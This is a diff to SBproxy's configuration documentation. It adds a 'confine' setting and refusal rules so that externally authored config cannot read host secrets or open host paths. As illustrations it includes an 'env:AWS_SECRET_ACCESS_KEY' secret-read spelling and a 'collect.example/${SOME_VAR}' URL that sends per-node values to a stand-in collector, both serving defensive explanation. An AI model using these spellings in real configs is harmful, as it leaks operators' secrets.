@@ -6420,7 +6420,7 @@ all three read a machine the fragment's author does not own:
 |---|---|---|
 | Name a process variable: `${VAR}`, `${VAR:-default}`, `{{env.X}}` | yes | refused, naming the variable |
 | Reference a secret the resolver reads off the host: `env:NAME`, `vault://env/NAME`, `file:PATH` | yes | refused, naming the form |
-| Name a host path the compiler inlines: `rego_module_path`, `module_path` | yes | refused, naming the key |
+| Name a host path the proxy opens: `rego_module_path`, `module_path`, `spec_file`, `spec_path`, `sha1_file`, `transcode.descriptor_set`, `bulk_list.path`, `feed.cache_dir`, `argument_policies[].path`, `result_policies[].path`, `agent_skills[].path` | yes | refused, naming the key and the inline alternative |
 
 The second row matters as much as the first and is easier to miss.
 `api_key: "env:AWS_SECRET_ACCESS_KEY"` contains no `${` and no `{{`, so
@@ -6430,11 +6430,22 @@ it out of the process environment at config load exactly the way
 syntax would refuse one spelling of an attack and wave through the
 other.
 
+The third row is a list of config keys, not a rule about files. Each key
+on it is one a module opens on the proxy host, and a module added later
+opens a path the list has never heard of until somebody adds it. Keys
+that take the *name* of an environment variable rather than its value
+(the WAF feed's `signature_key_env`, for instance) are deliberately not
+on it: the value never reaches the document or a response, and naming
+the variable is the only way to configure the feature at all.
+
 A reference to a backend the operator declared under `proxy.secrets`
 (`secret://acme/openai`, `vault://acme-vault/openai`, `awssm://...`)
 stays available to a fragment. Those resolve only against backends named
 in the root config, and `proxy.secrets` is not a path a fragment or an
-authority may set, so the operator still decides what they reach.
+authority may set, so the operator still decides what they reach. One
+exception, below: an extension bundle manifest does not get even those
+for a config value it authored itself, because the resolved secret lands
+in config that guest code reads.
 
 Helm draws the boundary the same way. Chart authors get every function
 in the Sprig library except `env` and `expandenv`, which were removed
@@ -6561,31 +6572,54 @@ not touch.
 #### Whole documents from somewhere else
 
 A fragment is not the only config text an operator does not write by
-hand. Two more arrive from another party, and both go through the same
-resolver:
+hand. Three more arrive from another party, and all of them go through
+the same resolver:
 
-- **A git-sourced document**, the `source:` block's `kind: git`. Whoever
-  can push to that repository writes the document.
 - **A config-authority bundle**, screened when the authority validates a
   publish and again when a subscriber merges one, so a payload cannot
   pass the authority and then be refused by the whole fleet at once.
+- **An extension bundle's own config values**. A bundle manifest can
+  declare a default for a config var and list that var in `secret_vars`,
+  which would have the host resolve a secret the bundle chose, into
+  config that guest code reads. A value the *bundle* authored resolves
+  nothing at all, not even a `secret://` reference to a backend you
+  declared; a value *you* wrote in `sb.yml` for the same key resolves
+  exactly as before. A signature on the bundle does not change this: it
+  says the bytes are the ones that author published, not that you agreed
+  to what they say.
+- **A git-sourced document** whose `source:` block sets
+  `confine: true`. Whoever can push to that repository writes the
+  document, and this is how you say that is somebody else.
 
-Both keep `${VAR}`: naming per-node values in one shared document is the
-documented pattern for running a fleet, and taking it away would break
-every git-sourced deployment on upgrade. Both lose the other two powers
-in the table above, and nothing breaks, because neither was ever a
-documented power of a remote document. `merge_config`'s deny list
-already reasons this way at the path level, refusing an authority any
-claim on `proxy.secrets` because the node owns its own secret backends;
-sealing `env:`, `vault://env/` and `file:` applies that same rule inside
-the values, which is where a path-level deny list cannot reach.
+The first and the last keep `${VAR}`: naming per-node values in one
+shared document is the documented pattern for running a fleet, and
+taking it away would break every git-sourced deployment on upgrade.
+They lose the other two powers in the table above. `merge_config`'s deny
+list already reasons this way at the path level, refusing an authority
+any claim on `proxy.secrets` because the node owns its own secret
+backends; sealing `env:`, `vault://env/` and `file:` applies that same
+rule inside the values, which is where a path-level deny list cannot
+reach.
 
-What that leaves open, stated rather than implied: a remote document may
-still write `url: "https://collect.example/${SOME_VAR}"` and have each
-node substitute its own value. The existing gate only refuses a `${VAR}`
-that fails to resolve. Closing that needs the node operator to declare
-which variable names a remote document may name, which is a config key
-this change does not add.
+Two things that leaves open, stated rather than implied.
+
+A remote document may still write
+`url: "https://collect.example/${SOME_VAR}"` and have each node
+substitute its own value. The existing gate only refuses a `${VAR}` that
+fails to resolve. Closing that needs the node operator to declare which
+variable names a remote document may name, which is a config key this
+change does not add.
+
+And the host-path half is a list of config keys, not a rule about files:
+`rego_module_path`, `module_path`, `spec_file`, `spec_path`, `sha1_file`,
+`transcode.descriptor_set`, `bulk_list.path`, `feed.cache_dir`,
+`argument_policies[].path`, `result_policies[].path` and
+`agent_skills[].path`. A module added later opens whatever path its own
+config key names, and this list has never heard of it until somebody adds
+it. Keys that take the *name* of an environment variable rather than its
+value, such as the WAF feed's `signature_key_env`, are deliberately not
+on the list: the value never reaches the document or a response, and
+naming the variable is the only way to configure the feature.
 
 Composition itself is still being built, so nothing in a stock `sb.yml`
 supplies a fragment yet. The boundary is documented here because it is
@@ -6776,6 +6810,7 @@ source:
   path: production/sb.yml
   credential: env:SB_GIT_TOKEN    # private repositories only
   verify_signature: false
+  confine: false                  # true when somebody else writes this repository
   timeout_secs: 60
   refresh_interval_secs: 60
 ```
@@ -6788,6 +6823,7 @@ source:
 | `path` | string | required for `git` | Path to the config file inside the repository. Relative, and `..` components are refused: this names a file in the repository, not a file on the proxy host. |
 | `credential` | secret ref | | `env:NAME`, `${NAME}`, `file:/path`, or `secret://backend/name`. An inline literal is refused. |
 | `verify_signature` | bool | `false` | Require a verifiable signature on the resolved tag or commit. |
+| `confine` | bool | `false` | Treat the fetched document as externally authored: no `env:NAME`, `file:PATH` or `vault://env/NAME` secret reference, and no config key that names a path on the proxy host. See [Confined fragments](#confined-fragments). |
 | `timeout_secs` | int | `60` | Hard timeout for one fetch, 1 to 3600. A `git` child, or the in-process clone, is stopped when it expires. |
 | `refresh_interval_secs` | int | `60` | How often to re-resolve while running. `0` resolves at boot and on ordinary reloads only. |
 
@@ -6799,6 +6835,9 @@ Two settings close most of that gap, and both are yours to choose:
 
 - **Pin `revision` to a full commit sha.** After fetching, SBproxy resolves `HEAD` and refuses the document when it is not the commit you named. A branch moving underneath a pinned node cannot be followed silently, and a pinned node never reloads on someone else's push.
 - **Set `verify_signature: true`.** The resolved tag is checked first, then the commit, and a missing or unverifiable signature refuses the document. The signing key has to be in the git trust store on the proxy host.
+- **Set `confine: true`** when the repository is written by somebody other than whoever runs the proxy. The fetched document then loses the two powers a document authored elsewhere was never granted: a secret reference that reads this host directly (`env:NAME`, `file:PATH`, `vault://env/NAME`) and a config key that names a path on this host for the proxy to open. `${VAR}` still resolves, because that is how one shared document names per-node values.
+
+  It is off by default on purpose. In the ordinary GitOps shape the repository *is* your config: the local file is a pointer, so "declare the value in the config you own" has nowhere to go, and `env:NAME` or `file:PATH` is the only spelling `proxy.cluster.security.shared_key` accepts (see [secrets](secrets.md)). Sealing that by default would leave a clustered node with no legal way to name its own secret. Turn it on when the trust boundary is real, and keep the secrets your nodes need in the pointer file or in a declared backend under `proxy.secrets`.
 
 ### How a git source is fetched
 
@@ -6825,6 +6864,7 @@ The interval carries jitter, so a fleet that restarts together does not hit your
 | Fetch exceeded `timeout_secs` | The fetch is cancelled (the `git` child is killed; the in-process fallback stops cooperatively). Keep serving. `timeout`. |
 | `revision` pins a sha and `HEAD` is a different commit | Refuse the document. `revision_mismatch`. |
 | `verify_signature` set and no verifiable signature | Refuse the document. `verify_failed`. |
+| `confine` set and the document reaches for this host | Refuse the document. `confinement_refused`. |
 | Resolved document does not compile or cannot be constructed | Refuse the document. `compile_failed`. |
 | Another reload in flight | Skip the cycle. `reload_busy`. |
 | Resolved commit unchanged | Nothing at all. `not_modified`. |
@@ -7088,7 +7128,7 @@ A rejected publish says which step caught it and confirms nothing was spent:
 }
 ```
 
-Codes are `invalid_payload`, `denied_path`, `compile_failed`, `construct_failed`, `model_runtime_invalid` (the payload is at fault, `400`), and `signing_failed`, `store_failed`, `internal` (the authority is at fault, `500`, safe to retry).
+Codes are `invalid_payload`, `denied_path`, `confinement_refused`, `compile_failed`, `construct_failed`, `model_runtime_invalid` (the payload is at fault, `400`), and `signing_failed`, `store_failed`, `internal` (the authority is at fault, `500`, safe to retry).
 
 ### The wire contract
 
@@ -7203,7 +7243,7 @@ One cycle: conditional `GET`, verify the envelope, merge over the local document
 
 A running node past `max_staleness` keeps serving and logs at error level every cycle. The window is a boot-time gate, not a kill switch: a control-plane outage should not take down a data plane that does not depend on it.
 
-**Observability.** `sbproxy_config_bundle_fetch_total{result}` counts one label per cycle (`ok`, `not_modified`, `unreachable`, `verify_failed`, `compile_failed`, `denied_path`, `reload_busy`), `sbproxy_config_bundle_revision` gauges the applied revision, and `sbproxy_config_bundle_age_seconds` gauges the age of the bundle currently serving, measured from local receipt rather than from the authority's `issued_at` so two disagreeing clocks cannot produce an absurd age at exactly the moment someone is trying to work out whether distribution is stuck.
+**Observability.** `sbproxy_config_bundle_fetch_total{result}` counts one label per cycle (`ok`, `not_modified`, `unreachable`, `verify_failed`, `compile_failed`, `denied_path`, `confinement_refused`, `reload_busy`), `sbproxy_config_bundle_revision` gauges the applied revision, and `sbproxy_config_bundle_age_seconds` gauges the age of the bundle currently serving, measured from local receipt rather than from the authority's `issued_at` so two disagreeing clocks cannot produce an absurd age at exactly the moment someone is trying to work out whether distribution is stuck.
 
 Changing `proxy.config_authority` requires a restart. The block sits on the deny list, so it is also the one thing an authority can never rewrite.
 
